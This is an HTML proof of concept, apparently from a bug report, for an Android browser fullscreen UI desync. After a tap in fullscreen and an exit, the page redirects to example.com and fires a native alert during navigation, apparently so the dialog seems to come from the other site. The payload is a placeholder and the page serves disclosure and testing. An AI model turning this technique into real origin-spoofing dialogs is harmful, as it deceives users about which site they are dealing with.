<!doctype html>
<meta charset="utf-8">
<title>Android Fullscreen UI Desync PoC</title>

<style>
body {
  font-family: system-ui, sans-serif;
  margin: 0;
  padding: 20px;
}
#hint {
  position: fixed;
  inset: 0;
  display: none;
  align-items: center;
  justify-content: center;
  background: black;
  color: white;
  font-size: 20px;
  z-index: 9999;
  user-select: none;
  pointer-events: none;
}
</style>

<button id="start">START (Fullscreen)</button>
<pre id="log"></pre>

<div id="hint">Tap once, then exit fullscreen</div>

<script>
let tappedInFullscreen = false;

const logMsg = m => {
  log.textContent += m + "\n";
  console.log(m);
};

/* Enter fullscreen (user gesture) */
start.onclick = async () => {
  logMsg("Tap → requestFullscreen()");
  await document.documentElement.requestFullscreen();
};

/* Record tap while fullscreen */
addEventListener("touchstart", () => {
  if (!document.fullscreenElement) return;
  if (tappedInFullscreen) return;
  tappedInFullscreen = true;
  logMsg("Touch recorded in fullscreen");
});

/* Fullscreen boundary */
addEventListener("fullscreenchange", () => {
  if (document.fullscreenElement) {
    hint.style.display = "flex";
    return;
  }

  hint.style.display = "none";
  logMsg("Exited fullscreen");

  // Redirect shortly after exit
  setTimeout(() => {
    logMsg("Navigating to example.com");
    location.href = "https://example.com";
  }, 30);

  if (!tappedInFullscreen) {
    logMsg("No activation → stop");
    return;
  }

  // Native dialog during navigation
  setTimeout(() => {
    alert("HELLO");
    logMsg("Alert shown");
  }, 60);
});
</script>
